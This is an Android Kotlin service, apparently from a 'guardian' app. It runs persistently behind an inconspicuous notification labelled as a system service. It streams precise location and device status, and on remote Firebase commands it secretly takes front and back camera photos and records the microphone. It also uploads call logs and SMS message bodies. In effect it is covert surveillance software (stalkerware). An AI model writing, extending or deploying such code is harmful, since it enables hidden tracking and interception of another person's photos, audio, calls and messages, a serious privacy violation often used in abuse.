package com.salzkreis.guardian.services

import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.provider.CallLog
import android.provider.Telephony
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.google.firebase.firestore.ListenerRegistration
import com.salzkreis.guardian.App
import com.salzkreis.guardian.managers.FirebaseManager
import kotlinx.coroutines.*
import kotlinx.coroutines.guava.await
import java.io.File
import java.util.concurrent.Executors

class GuardianService : LifecycleService() {

    private lateinit var firebaseManager: FirebaseManager
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var commandListener: ListenerRegistration? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private val cameraExecutor = Executors.newSingleThreadExecutor()

    private var fusedClient: com.google.android.gms.location.FusedLocationProviderClient? = null
    private var locationCallback: com.google.android.gms.location.LocationCallback? = null

    override fun onCreate() {
        super.onCreate()
        firebaseManager = FirebaseManager(this)
        startAsForeground()
        startLocationTracking()
        startCommandListener()
        scheduleStatusUpdates()
        serviceScope.launch { uploadLogs() }
    }

    private fun startAsForeground() {
        val notification = NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("Systemdienst")
            .setContentText("Aktiv")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                App.NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            @Suppress("DEPRECATION")
            startForeground(App.NOTIFICATION_ID, notification)
        }
    }

    private fun startLocationTracking() {
        fusedClient = com.google.android.gms.location.LocationServices
            .getFusedLocationProviderClient(this)

        val request = com.google.android.gms.location.LocationRequest.Builder(
            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 30_000L
        ).setMinUpdateIntervalMillis(15_000L).build()

        locationCallback = object : com.google.android.gms.location.LocationCallback() {
            override fun onLocationResult(result: com.google.android.gms.location.LocationResult) {
                result.lastLocation?.let { loc ->
                    serviceScope.launch {
                        runCatching {
                            firebaseManager.uploadLocation(loc.latitude, loc.longitude, loc.accuracy)
                        }
                    }
                }
            }
        }

        try {
            fusedClient?.requestLocationUpdates(request, locationCallback!!, mainLooper)
        } catch (e: SecurityException) { }
    }

    private fun startCommandListener() {
        commandListener = firebaseManager.listenForCommands { command, data ->
            when (command) {
                "take_photo_front" -> capturePhoto(CameraSelector.DEFAULT_FRONT_CAMERA, "front")
                "take_photo_back" -> capturePhoto(CameraSelector.DEFAULT_BACK_CAMERA, "back")
                "start_recording" -> startAudioRecording()
                "stop_recording" -> stopAudioRecording()
                "refresh_logs" -> serviceScope.launch { uploadLogs() }
            }
        }
    }

    private fun scheduleStatusUpdates() {
        serviceScope.launch {
            while (isActive) {
                runCatching { uploadDeviceStatus() }
                delay(60_000L)
            }
        }
    }

    private suspend fun uploadDeviceStatus() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val charging = bm.isCharging

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        val isMobile = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true

        val wifiName: String? = if (isWifi) {
            try {
                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                wm.connectionInfo?.ssid?.replace("\"", "")
            } catch (e: Exception) { null }
        } else null

        firebaseManager.uploadStatus(battery, charging, wifiName, isMobile)
    }

    private fun capturePhoto(selector: CameraSelector, label: String) {
        serviceScope.launch(Dispatchers.Main) {
            runCatching {
                val provider = ProcessCameraProvider.getInstance(this@GuardianService).await()
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                provider.unbindAll()
                provider.bindToLifecycle(this@GuardianService, selector, imageCapture)

                val file = File(cacheDir, "photo_${label}_${System.currentTimeMillis()}.jpg")
                imageCapture.takePicture(
                    ImageCapture.OutputFileOptions.Builder(file).build(),
                    cameraExecutor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            provider.unbindAll()
                            serviceScope.launch { runCatching { firebaseManager.uploadPhoto(file, label) } }
                        }
                        override fun onError(e: ImageCaptureException) { provider.unbindAll() }
                    }
                )
            }
        }
    }

    private fun startAudioRecording() {
        if (isRecording) return
        runCatching {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp4")
            mediaRecorder = MediaRecorder(this).apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            firebaseManager.setRecordingState(true)
        }
    }

    private fun stopAudioRecording() {
        if (!isRecording) return
        runCatching {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null
            isRecording = false
            firebaseManager.setRecordingState(false)
            cacheDir.listFiles { f -> f.name.startsWith("audio_") }
                ?.maxByOrNull { it.lastModified() }
                ?.let { file -> serviceScope.launch { runCatching { firebaseManager.uploadAudio(file) } } }
        }
    }

    private suspend fun uploadLogs() {
        uploadCallLogs()
        uploadSmsLogs()
    }

    private suspend fun uploadCallLogs() {
        val logs = mutableListOf<Map<String, Any>>()
        runCatching {
            contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    logs.add(mapOf(
                        "number" to (cursor.getString(0) ?: ""),
                        "duration" to cursor.getLong(1),
                        "type" to cursor.getInt(2),
                        "timestamp" to cursor.getLong(3)
                    ))
                    count++
                }
            }
        }
        if (logs.isNotEmpty()) firebaseManager.uploadCallLogs(logs)
    }

    private suspend fun uploadSmsLogs() {
        val logs = mutableListOf<Map<String, Any>>()
        runCatching {
            contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms.DATE} DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    logs.add(mapOf(
                        "address" to (cursor.getString(0) ?: ""),
                        "body" to (cursor.getString(1) ?: ""),
                        "type" to cursor.getInt(2),
                        "timestamp" to cursor.getLong(3)
                    ))
                    count++
                }
            }
        }
        if (logs.isNotEmpty()) firebaseManager.uploadSmsLogs(logs)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
        commandListener?.remove()
        serviceScope.cancel()
        cameraExecutor.shutdown()
        if (isRecording) stopAudioRecording()
    }
}
